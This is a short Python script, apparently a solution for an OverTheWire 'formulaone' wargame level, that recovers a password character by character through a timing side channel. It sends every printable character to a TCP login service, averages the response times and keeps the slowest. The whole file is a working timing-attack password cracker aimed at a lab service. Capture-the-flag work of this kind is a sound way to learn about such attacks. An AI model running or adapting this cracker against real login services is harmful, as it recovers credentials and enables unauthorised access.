import socket
import string
import time
from statistics import mean

def try_password(prefix):
    # Create new socket for each attempt
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 4091))
    # s.connect(('formulaone.labs.overthewire.org', 4091))
    
    # Send password and get response
    s.recv(1024).decode()
    start = time.time()
    s.send((prefix + '\n').encode())
    data = s.recv(1024).decode()
    elapsed = time.time() - start
    
    print(f"Trying {prefix}: {elapsed:.4f} seconds")
    print(f"Response: {data.strip()}")
    
    s.close()
    return elapsed

def find_password():
    password = ''
    chars = string.printable
    
    while len(password) < 32:
        times = {}
        for c in chars:
            # Try each character multiple times and average
            attempts = [try_password(password + c) for _ in range(5)]
            times[c] = mean(attempts)
        
        next_char = max(times, key=times.get)
        password += next_char
        print(f"\nFound so far: {password}\n")
        
        # Quick response usually means wrong prefix
        # if try_password(password) < 0.1:
        #     return password[:-1]
    
    return password

if __name__ == "__main__":
    print("Starting password search...")
    result = find_password()
    print(f"\nFinal password: {result}")
